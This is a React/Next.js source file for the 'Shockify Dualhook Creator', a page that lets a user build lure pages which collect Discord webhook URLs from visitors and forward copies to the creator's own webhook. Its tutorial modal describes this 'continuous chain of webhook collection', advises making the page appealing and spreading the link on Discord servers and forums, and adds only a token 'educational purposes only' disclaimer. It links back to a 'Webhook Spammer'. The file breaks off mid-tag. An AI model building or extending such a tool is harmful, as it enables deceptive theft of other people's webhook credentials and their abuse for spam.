"use client"
import { useState, useRef, useEffect } from "react"
import { motion, AnimatePresence } from "framer-motion"
import Link from "next/link"
import {
  Trash2,
  X,
  AlertCircle,
  CheckCircle,
  Info,
  Loader2,
  TestTube,
  Copy,
  HelpCircle,
  ChevronDown,
  ChevronUp,
  Shield,
  Zap,
  Sparkles,
  Eye,
  EyeOff,
  ArrowLeft,
  FileCode,
} from "lucide-react"
import { setupAllProtections } from "../protection"
import { createDualhook, testDualhook, generatePreview } from "./actions"

export default function DualhookCreator() {
  // Basic dualhook settings
  const [targetWebhook, setTargetWebhook] = useState("")
  const [dualhookName, setDualhookName] = useState("Shockify Dualhook")
  const [dualhookDescription, setDualhookDescription] = useState("Import webhooks and get access to exclusive content!")
  const [dualhookCode, setDualhookCode] = useState("")
  const [dualhookUrl, setDualhookUrl] = useState("")

  // Appearance settings
  const [theme, setTheme] = useState("purple")
  const [accentColor, setAccentColor] = useState("#8B5CF6")
  const [backgroundStyle, setBackgroundStyle] = useState("particles")
  const [logoUrl, setLogoUrl] = useState("")
  const [customCss, setCustomCss] = useState("")

  // Advanced settings
  const [redirectUrl, setRedirectUrl] = useState("")
  const [successMessage, setSuccessMessage] = useState(
    "Webhooks imported successfully! Thank you for your contribution.",
  )
  const [buttonText, setButtonText] = useState("Import Webhooks")
  const [showBranding, setShowBranding] = useState(true)
  const [requireVerification, setRequireVerification] = useState(false)
  const [minimumWebhooks, setMinimumWebhooks] = useState(1)

  // UI states
  const [isCreating, setIsCreating] = useState(false)
  const [showPreview, setShowPreview] = useState(false)
  const [previewHtml, setPreviewHtml] = useState("")
  const [activeTab, setActiveTab] = useState("basic")
  const [showTutorial, setShowTutorial] = useState(false)
  const [globalStatus, setGlobalStatus] = useState<string | null>(null)
  const [showSuccess, setShowSuccess] = useState(false)
  const [isLoaded, setIsLoaded] = useState(false)
  const [showCustomCss, setShowCustomCss] = useState(false)
  const [showHelp, setShowHelp] = useState(false)

  const canvasRef = useRef<HTMLCanvasElement>(null)

  // Set up protections
  useEffect(() => {
    const timer = setTimeout(() => {
      try {
        setupAllProtections()
      } catch (error) {
        console.error("Protection error:", error)
      }
    }, 1000)

    return () => clearTimeout(timer)
  }, [])

  // Canvas background effect (same as editing page)
  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return

    const ctx = canvas.getContext("2d")
    if (!ctx) return

    try {
      const updateSize = () => {
        canvas.width = window.innerWidth
        canvas.height = window.innerHeight
      }
      updateSize()
      window.addEventListener("resize", updateSize)

      const particles: { x: number; y: number; speed: number; size: number; opacity: number; color: string }[] = []
      const particleCount = 320 // 320 dots

      // Different shades of purple for variety (to match the site theme)
      const purpleColors = [
        "rgba(139, 92, 246, 0.4)", // Purple-500
        "rgba(124, 58, 237, 0.4)", // Purple-600
        "rgba(167, 139, 250, 0.3)", // Purple-400
        "rgba(109, 40, 217, 0.4)", // Purple-700
        "rgba(91, 33, 182, 0.4)", // Purple-800
      ]

      for (let i = 0; i < particleCount; i++) {
        // Randomly choose a shade of purple
        const color = purpleColors[Math.floor(Math.random() * purpleColors.length)]

        particles.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          speed: 0.1 + Math.random() * 0.2,
          size: 0.5 + Math.random() * 1.5,
          opacity: 0.3 + Math.random() * 0.4, // More subtle opacity
          color: color,
        })
      }

      let animationFrameId: number

      function animate() {
        if (!ctx || !canvas) return

        ctx.clearRect(0, 0, canvas.width, canvas.height)

        particles.forEach((particle) => {
          // Use the particle's color
          ctx.fillStyle = particle.color
          ctx.beginPath()
          ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2)
          ctx.fill()

          particle.y += particle.speed
          if (particle.y > canvas.height) {
            particle.y = 0
            particle.x = Math.random() * canvas.width
          }
        })

        animationFrameId = requestAnimationFrame(animate)
      }

      animate()
      setIsLoaded(true)

      return () => {
        window.removeEventListener("resize", updateSize)
        cancelAnimationFrame(animationFrameId)
      }
    } catch (error) {
      console.error("Canvas error:", error)
      setIsLoaded(true) // Ensure the site loads even if canvas fails
    }
  }, [])

  // Function to handle dualhook creation
  const handleCreateDualhook = async () => {
    if (!targetWebhook.startsWith("https://discord.com/api/webhooks/")) {
      setGlobalStatus("Please enter a valid Discord webhook URL")
      return
    }

    setIsCreating(true)
    setGlobalStatus("Creating your dualhook...")

    try {
      // Create the dualhook
      const result = await createDualhook({
        targetWebhook,
        name: dualhookName,
        description: dualhookDescription,
        theme,
        accentColor,
        backgroundStyle,
        logoUrl,
        customCss,
        redirectUrl,
        successMessage,
        buttonText,
        showBranding,
        requireVerification,
        minimumWebhooks: Number(minimumWebhooks),
      })

      if (result.success) {
        // Set the dualhook code and URL
        setDualhookCode(result.code)
        setDualhookUrl(`https://shockify.lol/dualhook/${result.code}`)
        setShowSuccess(true)
        setGlobalStatus("Dualhook created successfully!")
      } else {
        setGlobalStatus(`Error: ${result.message}`)
      }
    } catch (error) {
      console.error("Error creating dualhook:", error)
      setGlobalStatus("Failed to create dualhook. Please try again.")
    } finally {
      setIsCreating(false)
    }
  }

  // Function to test the dualhook
  const handleTestDualhook = async () => {
    if (!targetWebhook.startsWith("https://discord.com/api/webhooks/")) {
      setGlobalStatus("Please enter a valid Discord webhook URL")
      return
    }

    setGlobalStatus("Testing your dualhook...")

    try {
      const result = await testDualhook(targetWebhook)

      if (result.success) {
        setGlobalStatus("Test successful! Your webhook is working.")
      } else {
        setGlobalStatus(`Test failed: ${result.message}`)
      }
    } catch (error) {
      console.error("Error testing dualhook:", error)
      setGlobalStatus("Failed to test dualhook. Please try again.")
    }
  }

  // Function to generate a preview
  const handleGeneratePreview = async () => {
    setGlobalStatus("Generating preview...")

    try {
      const previewResult = await generatePreview({
        name: dualhookName,
        description: dualhookDescription,
        theme,
        accentColor,
        backgroundStyle,
        logoUrl,
        buttonText,
        showBranding,
      })

      if (previewResult.success) {
        setPreviewHtml(previewResult.html)
        setShowPreview(true)
        setGlobalStatus("Preview generated!")
      } else {
        setGlobalStatus(`Failed to generate preview: ${previewResult.message}`)
      }
    } catch (error) {
      console.error("Error generating preview:", error)
      setGlobalStatus("Failed to generate preview. Please try again.")
    }
  }

  // Function to copy the dualhook link
  const copyDualhookLink = () => {
    navigator.clipboard.writeText(dualhookUrl)
    setGlobalStatus("Dualhook link copied to clipboard")
  }

  // Function to get theme color based on selected theme
  const getThemeColor = () => {
    switch (theme) {
      case "purple":
        return "#8B5CF6"
      case "blue":
        return "#3B82F6"
      case "green":
        return "#10B981"
      case "red":
        return "#EF4444"
      case "orange":
        return "#F97316"
      case "pink":
        return "#EC4899"
      case "dark":
        return "#1F2937"
      case "light":
        return "#F3F4F6"
      default:
        return accentColor
    }
  }

  return (
    <div className="min-h-screen bg-black text-white relative overflow-hidden py-2 px-2 sm:px-4">
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(139,92,246,0.1),transparent_70%)]"></div>
      <div className="absolute top-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-purple-500 to-transparent opacity-30"></div>
      <div className="absolute bottom-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-purple-500 to-transparent opacity-30"></div>
      <canvas ref={canvasRef} className="absolute inset-0 pointer-events-none" />

      {/* Preview Modal */}
      {showPreview && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-gray-900 border border-purple-500/50 rounded-xl p-6 max-w-4xl w-full h-[80vh] shadow-2xl shadow-purple-900/20 flex flex-col">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-lg font-semibold text-white">Dualhook Preview</h3>
              <button
                onClick={() => setShowPreview(false)}
                className="text-gray-400 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="flex-1 overflow-hidden rounded-lg border border-gray-700 bg-black">
              <iframe srcDoc={previewHtml} className="w-full h-full" title="Dualhook Preview" />
            </div>

            <div className="mt-4 flex justify-end gap-2">
              <button
                onClick={() => setShowPreview(false)}
                className="bg-gray-800 hover:bg-gray-700 text-white px-3 py-1.5 rounded-md text-sm font-medium transition-colors"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Tutorial Modal */}
      {showTutorial && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-gray-900 border border-purple-500/50 rounded-xl p-6 max-w-4xl w-full max-h-[80vh] overflow-y-auto shadow-2xl shadow-purple-900/20">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                <Sparkles className="w-5 h-5 text-purple-400" />
                Dualhook Creator Tutorial
              </h3>
              <button
                onClick={() => setShowTutorial(false)}
                className="text-gray-400 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-6">
              <div className="bg-black/40 rounded-lg p-4 border border-purple-500/20">
                <h4 className="text-purple-400 font-medium mb-2">What is a Dualhook?</h4>
                <p className="text-gray-300 text-sm">
                  A dualhook is a special link that forwards all imported webhooks to your own webhook. When users
                  import webhooks through your dualhook link, you'll receive a copy of all the webhooks they import,
                  creating a continuous chain of webhook collection.
                </p>
              </div>

              <div className="space-y-4">
                <h4 className="text-purple-400 font-medium">How to Create a Dualhook:</h4>

                <div className="bg-black/40 rounded-lg p-4 border border-purple-500/20">
                  <div className="flex items-start gap-3">
                    <div className="bg-purple-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 mt-0.5">
                      1
                    </div>
                    <div>
                      <h5 className="font-medium text-white mb-1">Enter Your Webhook URL</h5>
                      <p className="text-gray-300 text-sm">
                        Start by entering your Discord webhook URL. This is where all collected webhooks will be sent.
                      </p>
                    </div>
                  </div>
                </div>

                <div className="bg-black/40 rounded-lg p-4 border border-purple-500/20">
                  <div className="flex items-start gap-3">
                    <div className="bg-purple-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 mt-0.5">
                      2
                    </div>
                    <div>
                      <h5 className="font-medium text-white mb-1">Customize Your Dualhook</h5>
                      <p className="text-gray-300 text-sm">
                        Personalize your dualhook with a name, description, theme, and other settings to make it more
                        appealing to users.
                      </p>
                    </div>
                  </div>
                </div>

                <div className="bg-black/40 rounded-lg p-4 border border-purple-500/20">
                  <div className="flex items-start gap-3">
                    <div className="bg-purple-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 mt-0.5">
                      3
                    </div>
                    <div>
                      <h5 className="font-medium text-white mb-1">Create Your Dualhook</h5>
                      <p className="text-gray-300 text-sm">
                        Click the "Create Dualhook" button to generate your unique dualhook link.
                      </p>
                    </div>
                  </div>
                </div>

                <div className="bg-black/40 rounded-lg p-4 border border-purple-500/20">
                  <div className="flex items-start gap-3">
                    <div className="bg-purple-600 text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 mt-0.5">
                      4
                    </div>
                    <div>
                      <h5 className="font-medium text-white mb-1">Share Your Dualhook</h5>
                      <p className="text-gray-300 text-sm">
                        Share your dualhook link with others. When they use it, all webhooks they import will be
                        forwarded to your webhook.
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              <div className="bg-black/40 rounded-lg p-4 border border-purple-500/20">
                <h4 className="text-purple-400 font-medium mb-2">Tips for Success:</h4>
                <ul className="text-gray-300 text-sm space-y-2">
                  <li className="flex items-start gap-2">
                    <Sparkles className="w-4 h-4 text-purple-400 flex-shrink-0 mt-0.5" />
                    <span>Make your dualhook page attractive with a good name and description</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Sparkles className="w-4 h-4 text-purple-400 flex-shrink-0 mt-0.5" />
                    <span>Choose a theme that matches your brand or content</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Sparkles className="w-4 h-4 text-purple-400 flex-shrink-0 mt-0.5" />
                    <span>Add a logo to make your dualhook look more professional</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Sparkles className="w-4 h-4 text-purple-400 flex-shrink-0 mt-0.5" />
                    <span>Use advanced settings to customize the user experience</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <Sparkles className="w-4 h-4 text-purple-400 flex-shrink-0 mt-0.5" />
                    <span>Share your dualhook link on Discord servers, forums, and social media</span>
                  </li>
                </ul>
              </div>

              <div className="bg-red-900/20 rounded-lg p-4 border border-red-500/20">
                <h4 className="text-red-400 font-medium mb-2 flex items-center gap-2">
                  <AlertCircle className="w-4 h-4" />
                  Important Warning:
                </h4>
                <p className="text-gray-300 text-sm">
                  This tool is for educational purposes only. Misuse of webhooks may violate Discord's Terms of Service.
                  Always use responsibly and ethically.
                </p>
              </div>
            </div>

            <div className="mt-6 flex justify-end">
              <button
                onClick={() => setShowTutorial(false)}
                className="bg-purple-700 hover:bg-purple-800 text-white px-4 py-2 rounded-md text-sm font-medium transition-colors"
              >
                Got it!
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Success Modal */}
      {showSuccess && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-gray-900 border border-purple-500/50 rounded-xl p-6 max-w-md w-full shadow-2xl shadow-purple-900/20">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                <CheckCircle className="w-5 h-5 text-green-400" />
                Dualhook Created!
              </h3>
              <button
                onClick={() => setShowSuccess(false)}
                className="text-gray-400 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="space-y-4">
              <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3">
                <p className="text-green-300 text-sm flex items-center gap-2">
                  <CheckCircle className="w-4 h-4" />
                  Your dualhook has been created successfully!
                </p>
              </div>

              <div className="space-y-2">
                <label className="block text-sm font-medium text-gray-300">Your Dualhook Link</label>
                <div className="flex items-center gap-2">
                  <input
                    type="text"
                    value={dualhookUrl}
                    readOnly
                    className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none text-xs"
                  />
                  <button
                    onClick={copyDualhookLink}
                    className="bg-purple-700 hover:bg-purple-800 text-white p-2 rounded-md text-xs font-medium transition-colors"
                    title="Copy dualhook link"
                  >
                    <Copy className="w-4 h-4" />
                  </button>
                </div>
              </div>

              <p className="text-xs text-gray-400">
                Share this link with others. When they use this dualhook, all imported webhooks will be forwarded to
                your webhook.
              </p>

              <div className="flex justify-end gap-2">
                <button
                  onClick={() => setShowSuccess(false)}
                  className="bg-gray-800 hover:bg-gray-700 text-white px-3 py-1.5 rounded-md text-sm font-medium transition-colors"
                >
                  Close
                </button>
                <button
                  onClick={() => {
                    window.open(dualhookUrl, "_blank")
                  }}
                  className="bg-purple-700 hover:bg-purple-800 text-white px-3 py-1.5 rounded-md text-sm font-medium flex items-center gap-1.5 transition-colors"
                >
                  <Eye className="w-4 h-4" />
                  View Dualhook
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: isLoaded ? 1 : 0, y: isLoaded ? 0 : 20 }}
        transition={{ duration: 0.8 }}
        className="relative z-10 container mx-auto flex flex-col items-center space-y-2 w-full max-w-4xl px-1 sm:px-4"
      >
        <div className="w-full flex justify-between items-center mb-1">
          <Link
            href="/webhook-spammer"
            className="text-purple-400 hover:text-purple-300 transition-colors flex items-center gap-1 px-2 py-1 rounded-md hover:bg-purple-950/20 text-sm"
          >
            <ArrowLeft className="w-4 h-4" />
            Back to Webhook Spammer
          </Link>
          <div className="flex items-center">
            <img
              src="https://cdn.discordapp.com/attachments/1338165117572874310/1361682289075163187/Schermafbeelding_2025-03-29_211158.png?ex=67ffa4f4&is=67fe5374&hm=fa29f8e189da4041ebfe4faac224090c3366674464ad33dfb757156230e4aad4&"
              alt="Shockify Logo"
              width={40}
              height={40}
              className="opacity-100 hover:opacity-90 transition-opacity rounded-full shadow-lg shadow-purple-500/30 border-2 border-purple-500/40 transform hover:scale-105 transition-transform duration-200"
            />
          </div>
        </div>

        <div className="w-full">
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            transition={{ duration: 0.8 }}
            className="flex items-center justify-center gap-1 mb-2"
          >
            <h1 className="text-lg sm:text-xl md:text-2xl font-bold text-center">
              <span className="bg-clip-text text-transparent bg-gradient-to-r from-purple-500 to-purple-300 purple-glow flex items-center gap-1 sm:gap-2 justify-center">
                <Zap className="w-3 h-3 sm:w-4 sm:h-4" />
                Shockify Dualhook Creator
                <Zap className="w-3 h-3 sm:w-4 sm:h-4" />
              </span>
            </h1>
          </motion.div>
        </div>

        <div className="w-full flex justify-center mb-3">
          <button
            onClick={() => setShowTutorial(true)}
            className="bg-gradient-to-r from-purple-600 to-purple-500 hover:from-purple-700 hover:to-purple-600 text-white px-4 py-2 rounded-md text-sm font-medium flex items-center gap-2 transition-all duration-300 shadow-lg shadow-purple-900/20 transform hover:scale-105"
          >
            <HelpCircle className="w-4 h-4" />
            How to Create a Dualhook
          </button>
        </div>

        {globalStatus && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className={`w-full mb-2 p-3 rounded-lg border ${
              globalStatus.includes("error") || globalStatus.includes("failed") || globalStatus.includes("Failed")
                ? "border-red-500/30 bg-red-900/10 text-red-200"
                : globalStatus.includes("success") ||
                    globalStatus.includes("Success") ||
                    globalStatus.includes("created")
                  ? "border-green-500/30 bg-green-900/10 text-green-200"
                  : "border-blue-500/30 bg-blue-900/10 text-blue-200"
            }`}
          >
            <p className="text-sm flex items-center gap-1.5">
              {globalStatus.includes("error") || globalStatus.includes("failed") || globalStatus.includes("Failed") ? (
                <AlertCircle className="w-4 h-4 flex-shrink-0" />
              ) : globalStatus.includes("success") ||
                globalStatus.includes("Success") ||
                globalStatus.includes("created") ? (
                <CheckCircle className="w-4 h-4 flex-shrink-0" />
              ) : (
                <Info className="w-4 h-4 flex-shrink-0" />
              )}
              {globalStatus}
            </p>
          </motion.div>
        )}

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.2 }}
          className="border border-purple-500/20 rounded-xl p-4 w-full bg-black/30 backdrop-blur-sm shadow-xl shadow-purple-900/10 relative overflow-hidden purple-glow-container"
        >
          {/* Shiny overlay effect */}
          <div className="absolute inset-0 bg-gradient-to-tr from-purple-900/5 via-purple-500/10 to-transparent pointer-events-none"></div>
          <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,rgba(139,92,246,0.15),transparent_70%)] pointer-events-none"></div>

          {/* Tabs */}
          <div className="flex border-b border-gray-800 mb-4 overflow-x-auto custom-scrollbar">
            <button
              onClick={() => setActiveTab("basic")}
              className={`px-4 py-2 text-sm font-medium ${
                activeTab === "basic"
                  ? "text-purple-400 border-b-2 border-purple-500"
                  : "text-gray-400 hover:text-gray-300"
              }`}
            >
              Basic Settings
            </button>
            <button
              onClick={() => setActiveTab("appearance")}
              className={`px-4 py-2 text-sm font-medium ${
                activeTab === "appearance"
                  ? "text-purple-400 border-b-2 border-purple-500"
                  : "text-gray-400 hover:text-gray-300"
              }`}
            >
              Appearance
            </button>
            <button
              onClick={() => setActiveTab("advanced")}
              className={`px-4 py-2 text-sm font-medium ${
                activeTab === "advanced"
                  ? "text-purple-400 border-b-2 border-purple-500"
                  : "text-gray-400 hover:text-gray-300"
              }`}
            >
              Advanced Settings
            </button>
          </div>

          {/* Basic Settings Tab */}
          {activeTab === "basic" && (
            <div className="space-y-4">
              <div className="space-y-2">
                <label className="block text-sm font-medium text-gray-300">Your Webhook URL</label>
                <input
                  type="text"
                  value={targetWebhook}
                  onChange={(e) => setTargetWebhook(e.target.value)}
                  placeholder="https://discord.com/api/webhooks/..."
                  className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm"
                />
                <p className="text-xs text-gray-400">This is where all collected webhooks will be sent.</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="block text-sm font-medium text-gray-300">Dualhook Name</label>
                  <input
                    type="text"
                    value={dualhookName}
                    onChange={(e) => setDualhookName(e.target.value)}
                    placeholder="My Dualhook"
                    className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm"
                  />
                </div>

                <div className="space-y-2">
                  <label className="block text-sm font-medium text-gray-300">Button Text</label>
                  <input
                    type="text"
                    value={buttonText}
                    onChange={(e) => setButtonText(e.target.value)}
                    placeholder="Import Webhooks"
                    className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm"
                  />
                </div>
              </div>

              <div className="space-y-2">
                <label className="block text-sm font-medium text-gray-300">Description</label>
                <textarea
                  value={dualhookDescription}
                  onChange={(e) => setDualhookDescription(e.target.value)}
                  placeholder="Import webhooks and get access to exclusive content!"
                  className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm min-h-[80px]"
                />
              </div>

              <div className="space-y-2">
                <label className="block text-sm font-medium text-gray-300">Success Message</label>
                <textarea
                  value={successMessage}
                  onChange={(e) => setSuccessMessage(e.target.value)}
                  placeholder="Webhooks imported successfully! Thank you for your contribution."
                  className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm min-h-[80px]"
                />
                <p className="text-xs text-gray-400">
                  This message will be shown after webhooks are successfully imported.
                </p>
              </div>
            </div>
          )}

          {/* Appearance Tab */}
          {activeTab === "appearance" && (
            <div className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="block text-sm font-medium text-gray-300">Theme</label>
                  <select
                    value={theme}
                    onChange={(e) => setTheme(e.target.value)}
                    className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm"
                  >
                    <option value="purple">Purple</option>
                    <option value="blue">Blue</option>
                    <option value="green">Green</option>
                    <option value="red">Red</option>
                    <option value="orange">Orange</option>
                    <option value="pink">Pink</option>
                    <option value="dark">Dark</option>
                    <option value="light">Light</option>
                    <option value="custom">Custom</option>
                  </select>
                </div>

                {theme === "custom" && (
                  <div className="space-y-2">
                    <label className="block text-sm font-medium text-gray-300">Accent Color</label>
                    <div className="flex items-center gap-2">
                      <input
                        type="color"
                        value={accentColor}
                        onChange={(e) => setAccentColor(e.target.value)}
                        className="bg-black/40 border border-gray-800 rounded p-0.5 h-[38px] w-[38px]"
                      />
                      <input
                        type="text"
                        value={accentColor}
                        onChange={(e) => setAccentColor(e.target.value)}
                        placeholder="#8B5CF6"
                        className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm"
                      />
                    </div>
                  </div>
                )}

                <div className="space-y-2">
                  <label className="block text-sm font-medium text-gray-300">Background Style</label>
                  <select
                    value={backgroundStyle}
                    onChange={(e) => setBackgroundStyle(e.target.value)}
                    className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm"
                  >
                    <option value="particles">Particles</option>
                    <option value="gradient">Gradient</option>
                    <option value="solid">Solid Color</option>
                    <option value="stars">Stars</option>
                    <option value="matrix">Matrix</option>
                  </select>
                </div>

                <div className="space-y-2">
                  <label className="block text-sm font-medium text-gray-300">Logo URL (Optional)</label>
                  <input
                    type="text"
                    value={logoUrl}
                    onChange={(e) => setLogoUrl(e.target.value)}
                    placeholder="https://example.com/logo.png"
                    className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm"
                  />
                </div>
              </div>

              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <label className="block text-sm font-medium text-gray-300">Custom CSS (Advanced)</label>
                  <button
                    onClick={() => setShowCustomCss(!showCustomCss)}
                    className="text-xs text-purple-400 hover:text-purple-300 transition-colors flex items-center gap-1"
                  >
                    {showCustomCss ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />}
                    {showCustomCss ? "Hide" : "Show"}
                  </button>
                </div>

                {showCustomCss && (
                  <div className="relative">
                    <textarea
                      value={customCss}
                      onChange={(e) => setCustomCss(e.target.value)}
                      placeholder="/* Add your custom CSS here */
.dualhook-container {
  /* Custom styles */
}
.dualhook-button {
  /* Custom button styles */
}"
                      className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm font-mono min-h-[150px]"
                    />
                    <div className="absolute top-2 right-2 flex gap-1">
                      <button
                        onClick={() => setCustomCss("")}
                        className="bg-red-900/30 hover:bg-red-900/50 text-red-300 p-1 rounded text-xs"
                        title="Clear CSS"
                      >
                        <Trash2 className="w-3 h-3" />
                      </button>
                      <button
                        onClick={() => {
                          setCustomCss(`/* Default Dualhook Styles */
.dualhook-container {
  background-color: #000;
  border-radius: 8px;
  border: 1px solid rgba(139, 92, 246, 0.3);
}
.dualhook-button {
  background: linear-gradient(to right, #8B5CF6, #7C3AED);
  color: white;
  border-radius: 6px;
  padding: 8px 16px;
  font-weight: 500;
  transition: all 0.3s ease;
}
.dualhook-button:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(139, 92, 246, 0.4);
}`)
                        }}
                        className="bg-purple-900/30 hover:bg-purple-900/50 text-purple-300 p-1 rounded text-xs"
                        title="Load template"
                      >
                        <FileCode className="w-3 h-3" />
                      </button>
                    </div>
                  </div>
                )}
                <p className="text-xs text-gray-400">
                  Add custom CSS to style your dualhook page. This is for advanced users.
                </p>
              </div>

              <div className="flex items-center gap-2 p-2 bg-gray-900/30 rounded-lg">
                <input
                  type="checkbox"
                  id="showBranding"
                  checked={showBranding}
                  onChange={(e) => setShowBranding(e.target.checked)}
                  className="rounded border-gray-700 text-purple-600 focus:ring-purple-500"
                />
                <label htmlFor="showBranding" className="text-sm text-gray-300">
                  Show Shockify branding on dualhook page
                </label>
              </div>
            </div>
          )}

          {/* Advanced Settings Tab */}
          {activeTab === "advanced" && (
            <div className="space-y-4">
              <div className="space-y-2">
                <label className="block text-sm font-medium text-gray-300">Redirect URL (Optional)</label>
                <input
                  type="text"
                  value={redirectUrl}
                  onChange={(e) => setRedirectUrl(e.target.value)}
                  placeholder="https://example.com/thank-you"
                  className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm"
                />
                <p className="text-xs text-gray-400">Users will be redirected to this URL after importing webhooks.</p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="block text-sm font-medium text-gray-300">Minimum Webhooks Required</label>
                  <input
                    type="number"
                    value={minimumWebhooks}
                    onChange={(e) => setMinimumWebhooks(Math.max(1, Number(e.target.value)))}
                    min="1"
                    className="w-full bg-black/40 border border-gray-800 rounded-lg p-2 focus:outline-none focus:border-purple-500 transition-colors text-sm"
                  />
                  <p className="text-xs text-gray-400">Minimum number of webhooks users must import.</p>
                </div>

                <div className="flex items-center gap-2 p-4 bg-gray-900/30 rounded-lg">
                  <input
                    type="checkbox"
                    id="requireVerification"
                    checked={requireVerification}
                    onChange={(e) => setRequireVerification(e.target.checked)}
                    className="rounded border-gray-700 text-purple-600 focus:ring-purple-500"
                  />
                  <label htmlFor="requireVerification" className="text-sm text-gray-300">
                    Require webhook verification
                    <p className="text-xs text-gray-400 mt-1">
                      Test each webhook to ensure it's valid before accepting it.
                    </p>
                  </label>
                </div>
              </div>

              <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-3">
                <p className="text-yellow-300 text-sm flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 flex-shrink-0" />
                  Advanced settings may affect user experience. Use with caution.
                </p>
              </div>
            </div>
          )}

          <div className="mt-6 flex flex-wrap gap-3 justify-center">
            <button
              onClick={handleTestDualhook}
              disabled={!targetWebhook.startsWith("https://discord.com/api/webhooks/")}
              className={`${
                !targetWebhook.startsWith("https://discord.com/api/webhooks/")
                  ? "bg-gray-700 cursor-not-allowed"
                  : "bg-blue-700 hover:bg-blue-800"
              } text-white px-4 py-2 rounded-md text-sm font-medium flex items-center gap-2 transition-colors shadow-lg`}
            >
              <TestTube className="w-4 h-4" />
              Test Webhook
            </button>

            <button
              onClick={handleGeneratePreview}
              className="bg-indigo-700 hover:bg-indigo-800 text-white px-4 py-2 rounded-md text-sm font-medium flex items-center gap-2 transition-colors shadow-lg"
            >
              <Eye className="w-4 h-4" />
              Preview
            </button>

            <button
              onClick={handleCreateDualhook}
              disabled={isCreating || !targetWebhook.startsWith("https://discord.com/api/webhooks/")}
              className={`${
                isCreating || !targetWebhook.startsWith("https://discord.com/api/webhooks/")
                  ? "bg-gray-700 cursor-not-allowed"
                  : "bg-gradient-to-r from-purple-700 to-purple-600 hover:from-purple-800 hover:to-purple-700"
              } text-white px-6 py-2 rounded-md text-sm font-medium flex items-center gap-2 transition-colors shadow-lg`}
            >
              {isCreating ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  Creating...
                </>
              ) : (
                <>
                  <Zap className="w-4 h-4" />
                  Create Dualhook
                </>
              )}
            </button>
          </div>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
          className="border border-purple-500/20 rounded-xl w-full bg-black/30 backdrop-blur-sm shadow-xl shadow-purple-900/10 overflow-hidden purple-glow-container"
        >
          <div
